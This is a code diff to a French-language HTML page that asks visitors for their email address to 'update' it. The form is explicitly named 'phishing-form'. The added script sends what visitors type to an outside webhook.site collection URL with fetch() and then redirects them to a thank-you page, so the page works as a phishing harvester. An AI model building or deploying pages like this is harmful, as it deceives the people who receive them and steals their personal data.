@@ -6,10 +6,29 @@
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <form action="https://webhook.site/dab8fffc-7387-49fa-83e5-0d146ae5b302" method="POST" target="_blank" onsubmit="window.location.href='merci.html';return false;">
+  <form id="phishing-form">
     <label for="email">Adresse email :</label>
     <input type="email" id="email" name="email" required>
     <button type="submit">Mettre à jour</button>
   </form>
+
+  <script>
+    const form = document.getElementById('phishing-form');
+    form.addEventListener('submit', function(e) {
+      e.preventDefault(); // empêche l'envoi "normal"
+
+      const formData = new FormData(form);
+      fetch("https://webhook.site/dab8fffc-7387-49fa-83e5-0d146ae5b302", {
+        method: "POST",
+        body: formData
+      }).then(() => {
+        // Redirige après l'envoi
+        window.location.href = "merci.html";
+      }).catch(err => {
+        alert("Erreur lors de l'envoi.");
+        console.error(err);
+      });
+    });
+  </script>
 </body>
 </html>
